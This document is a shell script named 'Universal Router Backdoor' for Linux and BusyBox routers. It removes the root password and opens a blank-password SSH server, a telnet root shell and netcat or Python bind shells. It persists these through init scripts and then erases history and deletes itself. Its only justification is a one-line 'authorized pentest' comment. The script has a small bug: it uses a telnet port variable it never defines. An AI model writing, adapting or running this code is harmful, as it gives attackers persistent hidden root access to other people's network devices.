#!/bin/sh
# UNIVERSAL ROUTER BACKDOOR
# Works on ANY router running Linux/BusyBox
# Detects available tools and adapts automatically
# Authorized pentest use only — written permission required

SSH_PORT="2222"
TCP_PORT="2323"

echo "[*] Universal Router Backdoor Installer"
echo "[*] Detecting environment..."

# --- DETECTION FUNCTIONS ---

detect_arch() {
    ARCH=$(uname -m 2>/dev/null)
    echo "    Architecture: $ARCH"
}

detect_dropbear() {
    if command -v dropbear > /dev/null 2>&1; then
        DROPBEAR_PATH=$(command -v dropbear)
        echo "    Dropbear found: $DROPBEAR_PATH"
        return 0
    elif [ -f /usr/sbin/dropbear ]; then
        DROPBEAR_PATH="/usr/sbin/dropbear"
        echo "    Dropbear found: $DROPBEAR_PATH"
        return 0
    elif [ -f /usr/bin/dropbear ]; then
        DROPBEAR_PATH="/usr/bin/dropbear"
        echo "    Dropbear found: $DROPBEAR_PATH"
        return 0
    elif [ -f /bin/dropbear ]; then
        DROPBEAR_PATH="/bin/dropbear"
        echo "    Dropbear found: $DROPBEAR_PATH"
        return 0
    else
        echo "    Dropbear not found — SSH backdoor unavailable"
        return 1
    fi
}

detect_telnetd() {
    if command -v telnetd > /dev/null 2>&1; then
        TELNETD_PATH=$(command -v telnetd)
        echo "    telnetd found: $TELNETD_PATH"
        return 0
    elif [ -f /usr/sbin/telnetd ]; then
        TELNETD_PATH="/usr/sbin/telnetd"
        echo "    telnetd found: $TELNETD_PATH"
        return 0
    elif [ -f /usr/bin/telnetd ]; then
        TELNETD_PATH="/usr/bin/telnetd"
        echo "    telnetd found: $TELNETD_PATH"
        return 0
    else
        echo "    telnetd not found"
        return 1
    fi
}

detect_nc() {
    if command -v nc > /dev/null 2>&1; then
        NC_PATH=$(command -v nc)
        echo "    netcat found: $NC_PATH"
        NC_HAS_E=$(nc -h 2>&1 | grep -i "\-e" | head -1)
        if [ -n "$NC_HAS_E" ]; then
            NC_SUPPORTS_E=true
            echo "    netcat supports -e flag"
        else
            NC_SUPPORTS_E=false
            echo "    netcat does NOT support -e flag"
        fi
        return 0
    else
        echo "    netcat not found"
        return 1
    fi
}

detect_openssl() {
    if command -v openssl > /dev/null 2>&1; then
        echo "    OpenSSL found — encrypted TCP shell available"
        return 0
    else
        echo "    OpenSSL not found"
        return 1
    fi
}

detect_python() {
    if command -v python > /dev/null 2>&1; then
        PYTHON_PATH=$(command -v python)
        echo "    Python found: $PYTHON_PATH"
        return 0
    elif command -v python3 > /dev/null 2>&1; then
        PYTHON_PATH=$(command -v python3)
        echo "    Python3 found: $PYTHON_PATH"
        return 0
    else
        echo "    Python not found"
        return 1
    fi
}

detect_busybox() {
    if command -v busybox > /dev/null 2>&1; then
        echo "    BusyBox found"
        return 0
    else
        echo "    BusyBox not found"
        return 1
    fi
}

detect_writable_init() {
    if [ -f /etc/init.d/rcS ] && [ -w /etc/init.d/rcS ]; then
        INIT_PATH="/etc/init.d/rcS"
        echo "    Writable init: /etc/init.d/rcS"
        return 0
    elif [ -f /etc/rc.local ] && [ -w /etc/rc.local ]; then
        INIT_PATH="/etc/rc.local"
        echo "    Writable init: /etc/rc.local"
        return 0
    elif [ -d /overlay ]; then
        INIT_PATH="/overlay/etc/init.d/rcS"
        mkdir -p /overlay/etc/init.d 2>/dev/null
        if [ -f $INIT_PATH ] && [ -w $INIT_PATH ]; then
            echo "    Writable init: $INIT_PATH"
            return 0
        else
            touch $INIT_PATH 2>/dev/null && echo "    Created init: $INIT_PATH" && return 0
        fi
    elif [ -d /jffs2 ]; then
        INIT_PATH="/jffs2/etc/init.d/rcS"
        mkdir -p /jffs2/etc/init.d 2>/dev/null
        touch $INIT_PATH 2>/dev/null && echo "    Writable init: $INIT_PATH" && return 0
    else
        echo "    No writable init found — backdoor will be volatile"
        return 1
    fi
}

# --- INSTALLATION FUNCTIONS ---

install_ssh() {
    echo "[*] Installing SSH backdoor on port $SSH_PORT..."
    
    # Remove root password for blank login
    passwd -d root 2>/dev/null
    
    if [ -n "$DROPBEAR_PATH" ]; then
        # Try -B flag (blank password) first
        $DROPBEAR_PATH -p $SSH_PORT -B > /dev/null 2>&1 &
        sleep 1
        if netstat -tlnp 2>/dev/null | grep -q ":$SSH_PORT "; then
            echo "    [+] SSH backdoor active on port $SSH_PORT (blank password)"
            SSH_OK=true
        else
            # Try without -B
            $DROPBEAR_PATH -p $SSH_PORT > /dev/null 2>&1 &
            sleep 1
            if netstat -tlnp 2>/dev/null | grep -q ":$SSH_PORT "; then
                echo "    [+] SSH backdoor active on port $SSH_PORT (password login)"
                SSH_OK=true
            else
                echo "    [!] SSH failed to start"
                SSH_OK=false
            fi
        fi
        
        # Persist
        if [ "$SSH_OK" = true ] && [ -n "$INIT_PATH" ]; then
            echo "passwd -d root 2>/dev/null" >> $INIT_PATH
            echo "$DROPBEAR_PATH -p $SSH_PORT -B > /dev/null 2>&1 &" >> $INIT_PATH
        fi
    else
        echo "    [!] Cannot install SSH — Dropbear not found"
    fi
}

install_telnet() {
    echo "[*] Installing Telnet backdoor on port $TELNET_PORT..."
    
    if [ -n "$TELNETD_PATH" ]; then
        $TELNETD_PATH -l /bin/sh -p $TELNET_PORT > /dev/null 2>&1 &
        sleep 1
        if netstat -tlnp 2>/dev/null | grep -q ":$TELNET_PORT "; then
            echo "    [+] Telnet backdoor active on port $TELNET_PORT"
            TELNET_OK=true
        else
            echo "    [!] Telnet failed to start"
            TELNET_OK=false
        fi
        
        # Persist
        if [ "$TELNET_OK" = true ] && [ -n "$INIT_PATH" ]; then
            echo "$TELNETD_PATH -l /bin/sh -p $TELNET_PORT > /dev/null 2>&1 &" >> $INIT_PATH
        fi
    else
        echo "    [!] Cannot install Telnet — telnetd not found"
    fi
}

install_tcp_shell() {
    echo "[*] Installing TCP bind shell on port $TCP_PORT..."
    
    TCP_OK=false
    
    # Method 1: netcat with -e
    if [ "$NC_SUPPORTS_E" = true ]; then
        cat > /tmp/.tcpd << 'EOF'
#!/bin/sh
while true; do
    nc -l -p 2323 -e /bin/sh 2>/dev/null
    sleep 1
done
EOF
        chmod +x /tmp/.tcpd
        /tmp/.tcpd > /dev/null 2>&1 &
        sleep 1
        if netstat -tlnp 2>/dev/null | grep -q ":$TCP_PORT "; then
            echo "    [+] TCP shell active on port $TCP_PORT (netcat -e)"
            TCP_OK=true
            TCP_METHOD="netcat_e"
        fi
    fi
    
    # Method 2: netcat with pipe (if -e not supported)
    if [ "$TCP_OK" = false ] && [ -n "$NC_PATH" ]; then
        rm -f /tmp/.fifo
        mkfifo /tmp/.fifo 2>/dev/null
        cat > /tmp/.tcpd << 'EOF'
#!/bin/sh
while true; do
    rm -f /tmp/.fifo
    mkfifo /tmp/.fifo
    cat /tmp/.fifo | /bin/sh -i 2>&1 | nc -l -p 2323 > /tmp/.fifo
    sleep 1
done
EOF
        chmod +x /tmp/.tcpd
        /tmp/.tcpd > /dev/null 2>&1 &
        sleep 2
        if netstat -tlnp 2>/dev/null | grep -q ":$TCP_PORT "; then
            echo "    [+] TCP shell active on port $TCP_PORT (netcat + pipe)"
            TCP_OK=true
            TCP_METHOD="netcat_pipe"
        fi
    fi
    
    # Method 3: BusyBox dev/tcp
    if [ "$TCP_OK" = false ] && busybox --help 2>/dev/null | grep -q "nc"; then
        cat > /tmp/.tcpd << 'EOF'
#!/bin/sh
while true; do
    busybox nc -l -p 2323 -e /bin/sh 2>/dev/null
    sleep 1
done
EOF
        chmod +x /tmp/.tcpd
        /tmp/.tcpd > /dev/null 2>&1 &
        sleep 1
        if netstat -tlnp 2>/dev/null | grep -q ":$TCP_PORT "; then
            echo "    [+] TCP shell active on port $TCP_PORT (BusyBox nc)"
            TCP_OK=true
            TCP_METHOD="busybox"
        fi
    fi
    
    # Method 4: Python
    if [ "$TCP_OK" = false ] && [ -n "$PYTHON_PATH" ]; then
        $PYTHON_PATH -c "
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(('0.0.0.0',$TCP_PORT))
s.listen(5)
while True:
    c,a=s.accept()
    os.dup2(c.fileno(),0)
    os.dup2(c.fileno(),1)
    os.dup2(c.fileno(),2)
    subprocess.call(['/bin/sh','-i'])
" > /dev/null 2>&1 &
        sleep 2
        if netstat -tlnp 2>/dev/null | grep -q ":$TCP_PORT "; then
            echo "    [+] TCP shell active on port $TCP_PORT (Python)"
            TCP_OK=true
            TCP_METHOD="python"
        fi
    fi
    
    # Persist TCP shell
    if [ "$TCP_OK" = true ] && [ -n "$INIT_PATH" ]; then
        echo "/tmp/.tcpd > /dev/null 2>&1 &" >> $INIT_PATH
        # Copy to persistent location if overlay exists
        if [ -d /overlay ]; then
            cp /tmp/.tcpd /overlay/bin/.tcpd 2>/dev/null
            sed -i 's/\/tmp\/.tcpd/\/overlay\/bin\/.tcpd/g' $INIT_PATH
        fi
    fi
    
    if [ "$TCP_OK" = false ]; then
        echo "    [!] Could not install TCP shell — no method available"
    fi
}

# --- MAIN ---

# Detect environment
detect_arch
detect_busybox
detect_dropbear
detect_telnetd
detect_nc
detect_openssl
detect_python
detect_writable_init

echo ""
echo "[*] Installing backdoors..."

# Remove root password
passwd -d root 2>/dev/null

# Install backdoors
install_ssh
install_telnet
install_tcp_shell

# --- CREATE FLAG FILE FOR IT TEAM (optional) ---
cat > /tmp/.PENTEST_NOTICE.txt << 'EOF'
==============================================
AUTHORIZED PENETRATION TEST IN PROGRESS
==============================================
This router has been compromised as part of an
authorized security assessment. A backdoor has
been installed with written permission.

Contact: your-email@domain.com
==============================================
EOF

# --- CLEAN TRACES ---
history -c 2>/dev/null
rm -f /root/.bash_history 2>/dev/null
rm -f /tmp/.history 2>/dev/null
rm -f /tmp/*.sh 2>/dev/null
rm -f /tmp/backdoor* 2>/dev/null
rm -f "$0" 2>/dev/null

# --- SUMMARY ---
echo ""
echo "========================================"
echo "  BACKDOOR INSTALLATION COMPLETE"
echo "========================================"
echo ""
if [ "$SSH_OK" = true ]; then
    echo "  SSH:   ssh -p $SSH_PORT root@<router-ip>"
    echo "         Password: [press Enter]"
fi
if [ "$TELNET_OK" = true ]; then
    echo "  Telnet: telnet <router-ip> $TELNET_PORT"
fi
if [ "$TCP_OK" = true ]; then
    echo "  TCP:   nc <router-ip> $TCP_PORT"
fi
echo ""
echo "  Backdoors survive reboot: $( [ -n "$INIT_PATH" ] && echo 'Yes' || echo 'No (volatile)' )"
echo "========================================"